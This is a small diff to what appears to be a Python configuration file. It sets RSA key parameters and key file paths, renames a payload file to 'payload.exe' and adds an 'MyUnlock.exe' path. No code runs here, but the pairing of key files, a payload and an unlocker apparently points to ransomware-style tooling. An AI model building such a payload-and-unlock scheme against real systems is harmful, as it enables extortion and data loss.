@@ -5,4 +5,5 @@ PUBLIC_EXPONENT = 65537
 RSA_KEY_LENGTH = 2048
 PRIVATE_KEY_FILE_PATH = "privateKey.pem"
 PUBLIC_KEY_FILE_PATH = "publicKey.pem"
-PAYLOAD_FILE_PATH = "payload"
+PAYLOAD_FILE_PATH = "payload.exe"
+MY_UNLOCK_FILE_PATH = "MyUnlock.exe"
